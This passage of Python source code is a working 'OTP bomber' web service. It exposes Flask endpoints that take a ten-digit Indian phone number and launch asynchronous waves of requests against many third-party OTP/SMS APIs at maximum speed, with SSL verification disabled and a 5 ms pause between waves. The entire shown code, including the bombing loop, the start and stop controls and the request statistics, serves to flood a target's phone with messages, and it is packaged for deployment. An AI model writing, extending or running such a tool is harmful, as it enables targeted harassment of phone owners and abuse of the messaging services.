                    "ssl": False,
                    "connector": self.connector
                }
                
                if method.upper() == "GET":
                    if data and isinstance(data, dict):
                        kwargs["params"] = data
                    elif data and isinstance(data, str):
                        kwargs["params"] = data
                else:
                    if data:
                        if isinstance(data, dict):
                            kwargs["json"] = data
                        else:
                            kwargs["data"] = data
                
                async with session.request(method, url, **kwargs) as response:
                    if 200 <= response.status < 300:
                        with self.lock:
                            self.success_count += 1
                            self.total_requests += 1
                        return True
                    return False
                    
            except Exception:
                with self.lock:
                    self.fail_count += 1
                    self.total_requests += 1
                return False

    async def ultra_fast_bomb(self, phone: str, stop_event: asyncio.Event):
        wave = 0
        
        async with aiohttp.ClientSession(connector=self.connector) as session:
            # Initial burst - all APIs at once
            tasks = [self.make_request(session, api, phone) for api in self.all_apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            while not stop_event.is_set():
                wave += 1
                # Use ALL APIs every wave for maximum speed
                batch_size = len(self.all_apis)
                selected_apis = random.sample(self.all_apis, min(batch_size, len(self.all_apis)))
                
                tasks = []
                for api in selected_apis:
                    api_copy = api.copy()
                    if "headers" in api_copy:
                        api_copy["headers"] = api_copy["headers"].copy()
                        api_copy["headers"]["X-Wave"] = str(wave)
                        api_copy["headers"]["X-Timestamp"] = str(int(time.time() * 1000))
                    
                    tasks.append(self.make_request(session, api_copy, phone))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                # Minimal delay for max speed
                await asyncio.sleep(0.005)

    def start_bombing(self, phone: str) -> dict:
        phone_key = f"bomb_{phone}"
        
        if phone_key in self.active_bombings and self.active_bombings[phone_key]["running"]:
            return {
                "status": "already_running",
                "message": f"🚀 Ultra Fast Bombing already active for {phone}"
            }
        
        stop_event = asyncio.Event()
        
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.is_running = True
        self.start_time = time.time()
        
        def run_bomb_loop():
            asyncio.set_event_loop(asyncio.new_event_loop())
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.ultra_fast_bomb(phone, stop_event))
        
        bomb_thread = threading.Thread(target=run_bomb_loop, daemon=True)
        bomb_thread.start()
        
        self.active_bombings[phone_key] = {
            "running": True,
            "stop_event": stop_event,
            "thread": bomb_thread,
            "start_time": time.time()
        }
        
        return {
            "status": "started",
            "message": f"🔥 ULTRA FAST BOMBING STARTED for {phone}",
            "total_apis": self.total_apis,
            "mode": "ULTRA FAST - MAXIMUM SPEED"
        }

    def stop_bombing(self, phone: str) -> dict:
        phone_key = f"bomb_{phone}"
        
        if phone_key not in self.active_bombings or not self.active_bombings[phone_key]["running"]:
            return {"status": "not_running", "message": f"No active bombing for {phone}"}
        
        self.active_bombings[phone_key]["stop_event"].set()
        self.active_bombings[phone_key]["running"] = False
        self.is_running = False
        
        duration = round(time.time() - self.active_bombings[phone_key]["start_time"], 2)
        
        return {
            "status": "stopped",
            "message": f"🛑 STOPPED bombing for {phone}",
            "stats": {
                "success": self.success_count,
                "failed": self.fail_count,
                "total": self.total_requests,
                "duration_seconds": duration,
                "requests_per_second": round(self.total_requests / duration, 2) if duration > 0 else 0
            }
        }

    def get_stats(self, phone: str = None) -> dict:
        duration = round(time.time() - (self.start_time or time.time()), 2)
        
        if phone:
            phone_key = f"bomb_{phone}"
            if phone_key in self.active_bombings:
                return {
                    "phone": phone,
                    "running": self.active_bombings[phone_key]["running"],
                    "duration_seconds": duration,
                    "success": self.success_count,
                    "failed": self.fail_count,
                    "total": self.total_requests,
                    "apis": self.total_apis
                }
            return {"phone": phone, "running": False}
        
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "total": self.total_requests,
            "duration_seconds": duration,
            "apis": self.total_apis,
            "active_bombings": sum(1 for b in self.active_bombings.values() if b["running"])
        }

    def stop_all(self) -> dict:
        stopped = []
        for key, bomb in list(self.active_bombings.items()):
            if bomb["running"]:
                bomb["stop_event"].set()
                bomb["running"] = False
                phone = key.replace("bomb_", "")
                stopped.append(phone)
        
        self.is_running = False
        return {
            "status": "stopped_all",
            "stopped_count": len(stopped),
            "phones": stopped
        }

# ==================================================================
# 🌐 FLASK API SERVER
# ==================================================================
bomber = UltraFastBomber()

@app.route('/')
def home():
    return jsonify({
        "service": "🔥 ULTRA FAST OTP BOMBER API v7.0",
        "status": "🚀 ONLINE",
        "total_apis": bomber.total_apis,
        "mode": "ULTRA FAST - MAXIMUM SPEED",
        "endpoints": {
            "/bomber?number=PHONE": "🚀 START bombing",
            "/stop?number=PHONE": "🛑 STOP bombing",
            "/stop_all": "🛑 STOP ALL",
            "/status": "📊 Check status",
            "/status?number=PHONE": "📊 Check specific phone"
        }
    })

@app.route('/bomber')
def bomb():
    phone = request.args.get('number', '').strip()
    
    if not phone:
        return jsonify({"error": "Phone number required", "usage": "/bomber?number=9876543210"}), 400
    
    country_code, clean_phone = validate_phone(phone)
    if not clean_phone or len(clean_phone) != 10:
        return jsonify({"error": "Invalid phone number. Use 10-digit Indian number."}), 400
    
    result = bomber.start_bombing(clean_phone)
    return jsonify(result)

@app.route('/stop')
def stop():
    phone = request.args.get('number', '').strip()
    
    if not phone:
        return jsonify({"error": "Phone number required", "usage": "/stop?number=9876543210"}), 400
    
    country_code, clean_phone = validate_phone(phone)
    if not clean_phone:
        return jsonify({"error": "Invalid phone number"}), 400
    
    result = bomber.stop_bombing(clean_phone)
    return jsonify(result)

@app.route('/stop_all')
def stop_all():
    result = bomber.stop_all()
    return jsonify(result)

@app.route('/status')
def status():
    phone = request.args.get('number', '').strip()
    
    if phone:
        country_code, clean_phone = validate_phone(phone)
        if clean_phone:
            result = bomber.get_stats(clean_phone)
            return jsonify(result)
    
    return jsonify({
        "service": "ULTRA FAST OTP BOMBER",
        "status": "🚀 ONLINE",
        "total_apis": bomber.total_apis,
        "stats": bomber.get_stats()
    })

# ==================================================================
# 🚀 RUN SERVER
# ==================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║   🔥 ULTRA FAST OTP BOMBER API v7.0                            ║
    ║   📦 Deployed on Render.com                                    ║
    ║                                                                  ║
    ║   📦 Total APIs: {}                                       ║
    ║   🔄 Mode: ULTRA FAST - MAXIMUM SPEED                        ║
    ║                                                                  ║
    ║   🚀 Server: http://0.0.0.0:{}                            ║
    ║   📡 Start: /bomber?number=9876543210                        ║
    ║   🛑 Stop: /stop?number=9876543210                           ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    """.format(bomber.total_apis, port))
    
    app.run(host='0.0.0.0', port=port, debug=False)
